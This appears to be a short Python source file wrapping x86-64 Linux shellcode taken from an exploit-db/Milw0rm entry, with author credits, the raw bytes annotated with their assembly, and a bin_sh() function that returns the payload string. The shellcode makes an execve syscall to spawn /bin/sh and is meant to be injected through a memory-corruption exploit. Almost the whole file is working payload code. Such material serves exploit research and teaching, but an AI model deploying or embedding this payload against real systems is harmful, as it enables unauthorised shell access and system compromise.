#https://www.exploit-db.com/exploits/13279/
#* Authors:
#*    Maycon M. Vitali ( 0ut0fBound )
#*        Milw0rm .: http://www.milw0rm.com/author/869
#*        Page ....: http://maycon.hacknroll.com
#*        Email ...: maycon@hacknroll.com
#*
#*    Anderson Eduardo ( c0d3_z3r0 )
#*        Milw0rm .: http://www.milw0rm.com/author/1570
#*        Page ....: http://anderson.hacknroll.com
#*        Email ...: anderson@hacknroll.com
#
#amd64# gcc hacknroll.c -o hacknroll
#amd64# ./hacknroll
# exit
#amd64#

"""
		"\x48\x31\xc0"                               // xor    %rax,%rax
		"\x99"                                       // cltd
		"\xb0\x3b"                                   // mov    $0x3b,%al
		"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68"   // mov $0x68732f6e69622fff,%rdi
		"\x48\xc1\xef\x08"                           // shr    $0x8,%rdi
		"\x57"                                       // push   %rdi
		"\x48\x89\xe7"                               // mov    %rsp,%rdi
		"\x57"                                       // push   %rdi
		"\x52"                                       // push   %rdx
		"\x48\x89\xe6"                               // mov    %rsp,%rsi
		"\x0f\x05";                                  // syscall
"""




def bin_sh():
	shellcode  =  r"\x48\x31\xc0\x99\xb0\x3b"
	shellcode +=  r"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
	shellcode +=  r"\x48\xc1\xef\x08\x57\x48\x89\xe7\x57\x52"
	shellcode +=  r"\x48\x89\xe6\x0f\x05"
	return shellcode



